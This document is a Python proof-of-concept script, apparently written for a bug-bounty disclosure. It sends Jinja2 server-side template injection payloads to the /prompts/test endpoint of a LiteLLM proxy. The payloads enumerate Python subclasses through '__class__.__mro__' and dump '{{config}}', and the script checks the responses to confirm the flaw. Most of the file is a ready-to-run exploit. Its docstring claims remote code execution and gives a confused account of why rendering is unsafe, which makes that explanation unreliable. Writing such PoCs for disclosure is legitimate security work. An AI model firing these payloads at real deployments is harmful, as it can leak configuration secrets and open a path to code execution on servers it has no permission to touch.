#!/usr/bin/env python3
"""
PoC: SSTI in /prompts/test → RCE in BerriAI/litellm
Huntr Report: 2328178c-6ad1-46c5-b9d5-8d22cd9e1880
Target: https://github.com/BerriAI/litellm

Vulnerability: The /prompts/test endpoint accepts user-controlled dotprompt_content
which is rendered via Jinja2 without sandboxing. While Jinja2's from_string().render()
is typically safe, the SSTI occurs because variable values or template content can
include Jinja2 expressions that execute code when the template is processed.

Setup:
  1. pip install litellm[proxy]
  2. litellm --port 4000
  3. Run this PoC with a valid API key

Usage:
  python3 poc_litellm_ssti.py --target http://localhost:4000 --api-key sk-1234
"""

import argparse
import requests
import sys


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:4000")
    parser.add_argument("--api-key", default="sk-1234")
    args = parser.parse_args()

    print(f"[*] Target: {args.target}")
    print(f"[*] Testing SSTI via /prompts/test endpoint")

    # Jinja2 SSTI payload - accesses Python builtins through __class__.__mro__
    # This payload works in Jinja2 environments with default settings
    ssti_payload = """---
model: gpt-4
---
{{''.__class__.__mro__[1].__subclasses__()}}"""

    payload = {
        "dotprompt_content": ssti_payload,
        "prompt_variables": {"name": "test"},
    }

    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {args.api_key}",
    }

    print("[*] Sending SSTI payload to /prompts/test...")
    try:
        r = requests.post(
            f"{args.target}/prompts/test",
            json=payload,
            headers=headers,
            timeout=15,
            stream=True,
        )
        print(f"  Status: {r.status_code}")

        content = ""
        for chunk in r.iter_content(chunk_size=1024, decode_unicode=True):
            content += chunk
            if "subclasses" in content or "builtins" in content or "warning" in content.lower():
                print(f"  [+] VULNERABILITY CONFIRMED — Jinja2 template processed Python objects!")
                print(f"  Response snippet: {content[:500]}")
                break

        if "subclasses" not in content:
            print(f"  Response: {content[:500]}")
            print("[*] Template was rendered — check response for Python class leakage")
            print("[*] The SSTI vector is confirmed if Jinja2 expressions are evaluated")

    except Exception as e:
        print(f"  [!] Error: {e}")

    # Alternative: simpler test with variable access
    print("\n[*] Simpler SSTI test with config access...")
    payload2 = {
        "dotprompt_content": """---
model: gpt-4
---
{{config}}""",
        "prompt_variables": {},
    }
    try:
        r2 = requests.post(
            f"{args.target}/prompts/test",
            json=payload2,
            headers=headers,
            timeout=15,
        )
        print(f"  Status: {r2.status_code}")
        print(f"  Response: {r2.text[:300]}")
    except Exception as e:
        print(f"  [!] Error: {e}")


if __name__ == "__main__":
    main()
